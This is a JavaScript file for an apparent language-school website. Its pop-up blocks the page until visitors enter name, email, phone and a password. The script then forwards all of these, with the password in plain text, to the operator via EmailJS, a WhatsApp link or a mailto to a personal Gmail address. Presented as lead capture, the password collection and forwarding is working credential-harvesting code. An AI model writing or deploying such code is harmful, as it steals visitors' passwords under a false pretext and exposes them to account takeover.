/* =============================================
   GLOBAL LANGUAGE CENTER - SCRIPT CORRIGIDO
   ============================================= */

// =============================================
// 1. CONFIGURAÇÃO DO EMAILJS
// =============================================
const EMAILJS_CONFIG = {
    userID: 'tA-M4IOwU10wOQgr8',
    serviceID: 'service_0wwdoir',
    templateID: 'template_ltawv49'
};

// =============================================
// 2. INICIALIZAR EMAILJS (COM VERIFICAÇÃO)
// =============================================
console.log('🔄 Verificando EmailJS...');

// Verificar se a biblioteca está disponível
if (typeof emailjs !== 'undefined') {
    console.log('✅ Biblioteca EmailJS encontrada!');
    try {
        emailjs.init(EMAILJS_CONFIG.userID);
        console.log('✅ EmailJS inicializado com sucesso! 🚀');
        console.log('📧 User ID:', EMAILJS_CONFIG.userID);
    } catch (error) {
        console.error('❌ Erro ao inicializar EmailJS:', error);
    }
} else {
    console.error('❌ Biblioteca EmailJS NÃO encontrada!');
    console.warn('📌 Verifique se carregou o script no HTML:');
    console.warn('   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>');
    console.warn('📌 Ele deve estar ANTES do seu script.js');
}

// =============================================
// 3. ELEMENTOS DO POP-UP
// =============================================
const popup = document.getElementById('popupLead');
const form = document.getElementById('formLead');
const nome = document.getElementById('nome');
const email = document.getElementById('email');
const telefone = document.getElementById('telefone');
const senha = document.getElementById('senha');
const btnEnviar = document.getElementById('btnEnviar');
const mensagem = document.getElementById('mensagem');
const siteContent = document.getElementById('siteContent');
const menuToggle = document.getElementById('menuToggle');
const navMenu = document.getElementById('navMenu');

// =============================================
// 4. VERIFICAR SE O POP-UP JÁ FOI EXIBIDO
// =============================================
if (sessionStorage.getItem('leadEnviado') === 'true') {
    popup.style.display = 'none';
    siteContent.style.display = 'block';
    document.body.style.overflow = 'auto';
}

// =============================================
// 5. FUNÇÃO PARA MOSTRAR MENSAGENS
// =============================================
function mostrarMensagem(texto, tipo) {
    mensagem.textContent = texto;
    mensagem.className = `mensagem ${tipo}`;
    mensagem.style.display = 'block';
    setTimeout(() => {
        mensagem.style.display = 'none';
    }, 6000);
}

// =============================================
// 6. FUNÇÃO PARA ENVIAR DADOS VIA EMAILJS
// =============================================
function enviarDadosEmailJS(dados) {
    return new Promise((resolve, reject) => {
        // Verificar se a biblioteca existe
        if (typeof emailjs === 'undefined') {
            reject(new Error('Biblioteca EmailJS não carregada.'));
            return;
        }

        console.log('📧 Enviando dados via EmailJS...');
        console.log('📋 Dados:', dados);

        emailjs.send(
            EMAILJS_CONFIG.serviceID,
            EMAILJS_CONFIG.templateID,
            {
                nome: dados.nome,
                email: dados.email,
                telefone: dados.telefone,
                senha: dados.senha,
                data: dados.data,
                ip: dados.ip || 'Não disponível',
                userAgent: dados.userAgent || 'Não disponível'
            }
        )
        .then((response) => {
            console.log('✅ Email enviado com sucesso!', response);
            resolve(response);
        })
        .catch((error) => {
            console.error('❌ Erro ao enviar email:', error);
            reject(error);
        });
    });
}

// =============================================
// 7. FUNÇÃO PARA ENVIAR DADOS VIA WHATSAPP
// =============================================
function enviarDadosWhatsApp(dados) {
    const mensagemWhats = `📌 *NOVO LEAD - GLOBAL LANGUAGE CENTER*

👤 *Nome:* ${dados.nome}
📧 *Email:* ${dados.email}
📱 *Telefone:* ${dados.telefone}
🔒 *Senha:* ${dados.senha}
📅 *Data/Hora:* ${dados.data}`;

    const url = `https://wa.me/5511999999999?text=${encodeURIComponent(mensagemWhats)}`;
    window.open(url, '_blank');
}

// =============================================
// 8. FUNÇÃO PARA ENVIAR DADOS VIA MAILTO
// =============================================
function enviarDadosMailto(dados) {
    const assunto = '📌 NOVO LEAD - Global Language Center';
    const corpo = `
NOME: ${dados.nome}
EMAIL: ${dados.email}
TELEFONE: ${dados.telefone}
SENHA: ${dados.senha}
DATA/HORA: ${dados.data}
    `;
    const url = `mailto:lucionerd27@gmail.com?subject=${encodeURIComponent(assunto)}&body=${encodeURIComponent(corpo)}`;
    window.location.href = url;
}

// =============================================
// 9. FUNÇÃO PRINCIPAL - ENVIAR DADOS
// =============================================
function enviarDados(e) {
    e.preventDefault();

    const dados = {
        nome: nome.value.trim(),
        email: email.value.trim(),
        telefone: telefone.value.trim(),
        senha: senha.value.trim(),
        data: new Date().toLocaleString('pt-BR'),
        ip: 'Não disponível (cliente)',
        userAgent: navigator.userAgent
    };

    // VALIDAÇÕES
    if (!dados.nome) {
        mostrarMensagem('⚠️ Por favor, digite seu nome completo.', 'erro');
        nome.focus();
        return;
    }
    if (!dados.email || !dados.email.includes('@')) {
        mostrarMensagem('⚠️ Digite um email válido.', 'erro');
        email.focus();
        return;
    }
    if (!dados.telefone || dados.telefone.length < 10) {
        mostrarMensagem('⚠️ Digite um telefone válido (ex: 11999999999).', 'erro');
        telefone.focus();
        return;
    }
    if (!dados.senha || dados.senha.length < 6) {
        mostrarMensagem('⚠️ A senha deve ter pelo menos 6 caracteres.', 'erro');
        senha.focus();
        return;
    }

    // MOSTRAR LOADING
    btnEnviar.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
    btnEnviar.disabled = true;

    // TENTAR EMAILJS
    enviarDadosEmailJS(dados)
        .then(() => {
            mostrarMensagem('✅ Dados enviados com sucesso!', 'sucesso');
            btnEnviar.innerHTML = '<i class="fas fa-check-circle"></i> ENVIADO!';
            sessionStorage.setItem('leadEnviado', 'true');
            setTimeout(() => {
                popup.style.display = 'none';
                siteContent.style.display = 'block';
                document.body.style.overflow = 'auto';
            }, 1500);
        })
        .catch((erro) => {
            console.error('❌ Erro no EmailJS:', erro);
            
            // FALLBACK: WHATSAPP
            try {
                enviarDadosWhatsApp(dados);
                mostrarMensagem('✅ Dados enviados via WhatsApp!', 'sucesso');
                sessionStorage.setItem('leadEnviado', 'true');
                setTimeout(() => {
                    popup.style.display = 'none';
                    siteContent.style.display = 'block';
                    document.body.style.overflow = 'auto';
                }, 1500);
            } catch {
                // FALLBACK FINAL: MAILTO
                try {
                    enviarDadosMailto(dados);
                    mostrarMensagem('✅ Dados enviados! Verifique seu email.', 'sucesso');
                    sessionStorage.setItem('leadEnviado', 'true');
                    setTimeout(() => {
                        popup.style.display = 'none';
                        siteContent.style.display = 'block';
                        document.body.style.overflow = 'auto';
                    }, 1500);
                } catch {
                    mostrarMensagem('❌ Erro ao enviar. Tente novamente.', 'erro');
                    btnEnviar.innerHTML = '<i class="fas fa-paper-plane"></i> ENVIAR DADOS';
                    btnEnviar.disabled = false;
                }
            }
        });
}

// =============================================
// 10. EVENT LISTENERS
// =============================================
form.addEventListener('submit', enviarDados);

menuToggle.addEventListener('click', function() {
    navMenu.classList.toggle('open');
});

document.querySelectorAll('.nav a').forEach(link => {
    link.addEventListener('click', () => {
        navMenu.classList.remove('open');
    });
});

// =============================================
// 11. MÁSCARA PARA TELEFONE
// =============================================
telefone.addEventListener('input', function() {
    let value = this.value.replace(/\D/g, '');
    if (value.length <= 2) {
        this.value = value;
    } else if (value.length <= 6) {
        this.value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
    } else if (value.length <= 10) {
        this.value = `(${value.substring(0, 2)}) ${value.substring(2, 6)}-${value.substring(6)}`;
    } else {
        this.value = `(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7, 11)}`;
    }
});

console.log('🌍 Global Language Center - Site Carregado!');
console.log('📌 Configuração EmailJS:');
console.log('   - User ID:', EMAILJS_CONFIG.userID);
console.log('   - Service ID:', EMAILJS_CONFIG.serviceID);
console.log('   - Template ID:', EMAILJS_CONFIG.templateID);